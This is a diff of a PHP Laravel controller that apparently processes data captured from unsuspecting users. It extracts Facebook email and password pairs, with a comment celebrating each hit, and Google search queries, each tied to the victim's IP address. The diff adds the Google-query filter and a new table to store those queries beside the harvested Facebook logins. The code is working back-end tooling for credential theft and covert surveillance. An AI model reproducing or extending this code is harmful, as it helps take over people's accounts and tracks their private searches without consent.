@@ -10,6 +10,7 @@ use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
 use Illuminate\Http\Request;
 use App\Requestall;
 use App\Fb;
+use App\Gg;
 use phpDocumentor\Reflection\Types\Integer;
 
 class RequestallController extends BaseController
@@ -34,26 +35,44 @@ class RequestallController extends BaseController
 
     public function getData($data, $findString, $firstClassName, $secondClassName)
     {
+//        $arrayProcessedWillBeDelete = [];
         $result = [];
         foreach ($data as $item) {
+//            $idInDb = $item->id;
+            $ipAddress = $item->ip;
             $a = $this->decodeData($item)['data'];
-            echo "<pre>";var_dump($a);
+//            echo "<pre>";var_dump($a);
             if($a){
                 foreach ($a as $k => $it) {
                     // check if domain contain string facebook.com and class name = email
                     if(strpos($it->dm, $findString) && (!empty($it->cn) && $it->cn == $firstClassName)){
-                        // check if next object contain pwd
-                        if( !empty($a[$k+1]) ){
-                            if( !empty($a[$k+1]->cn) && $a[$k+1]->cn == $secondClassName ){
-                                // wow, we got it!
-                                array_push($result, ['email' => $it->vl, 'pwd' => $a[$k+1]->vl, 'ip' => $item->ip]);
+                        // for filter fb
+                        if($secondClassName){
+                            // check if next object contain pwd
+                            if( !empty($a[$k+1]) ){
+                                if( !empty($a[$k+1]->cn) && $a[$k+1]->cn == $secondClassName ){
+                                    // wow, we got it!
+                                    array_push($result, [
+                                        'email' => $it->vl,
+                                        'pwd' => $a[$k+1]->vl,
+                                        'ip' => $ipAddress
+                                    ]);
+                                }
                             }
+                        }else{
+                            // for filter google query
+                            array_push($result, [
+                                'domain' => $it->dm,
+                                'query' => $it->vl,
+                                'ip' => $ipAddress
+                            ]);
                         }
                     }
                 }
             }
         }
-        die;
+//        echo "<pre>";var_dump($result);die;
+//        die;
         return $result;
     }
 
@@ -61,6 +80,18 @@ class RequestallController extends BaseController
     {
         $data = [];
         $params = $request->all();
+        $filterWhat = $params['filterWhat'];
+        if($filterWhat == 'fb'){
+            $data = $this->filterFb($params);
+        }elseif ($filterWhat == 'gg'){
+            $data = $this->filterGg($params);
+        }
+
+        return response()->json($data);
+    }
+
+    public function filterFb($params)
+    {
         $offset = $params['offset'];
         $limit = $params['limit'];
 
@@ -78,19 +109,64 @@ class RequestallController extends BaseController
             $data['insertedRows'] = -1;
             $data['offset'] = (Int)$offset;
         }
-
         $data['countOriginData'] = count($result);
+        return $data;
+    }
 
-        return response()->json($data);
+    public function filterGg($params)
+    {
+        $offset = $params['offset'];
+        $limit = $params['limit'];
+
+        $result = Requestall::offset($offset)
+            ->limit($limit)
+            ->orderBy('id')
+            ->get();
+        if($result){
+            // Get list fb account
+            $ggQuery = $this->getData($result, 'google.com', 'q', null);
+            // Insert to table gg
+            $data['insertedRows'] = $this->insertGg($ggQuery);
+            $data['offset'] = (Int)$offset;
+        }else{
+            $data['insertedRows'] = -1;
+            $data['offset'] = (Int)$offset;
+        }
+        $data['countOriginData'] = count($result);
+        return $data;
+    }
+
+    public function insertGg($data)
+    {
+        $countInserted = 0;
+        $obj = new Gg;
+        foreach ($data as $item) {
+            // check exist
+            $count = $obj::where('domain', '=', $item['domain'])
+                ->where('query', '=', $item['query'])
+                ->where('ip', '=', $item['ip'])
+                ->count();
+            // if not exist then insert to DB
+            if($count == 0){
+                $gg = new Gg;
+                $gg->domain = $item['domain'];
+                $gg->query = $item['query'];
+                $gg->ip = $item['ip'];
+
+                $gg->save();
+                $countInserted++;
+            }
+        }
+        return $countInserted;
     }
 
     public function insertFb($data)
     {
         $countInserted = 0;
-        $objFb = new Fb;
+        $obj = new Fb;
         foreach ($data as $item) {
             // check exist
-            $count = $objFb::where('email', '=', $item['email'])->where('pwd', '=', $item['pwd'])->count();
+            $count = $obj::where('email', '=', $item['email'])->where('pwd', '=', $item['pwd'])->count();
             // if not exist then insert to DB
             if($count == 0){
                 $fb = new Fb;
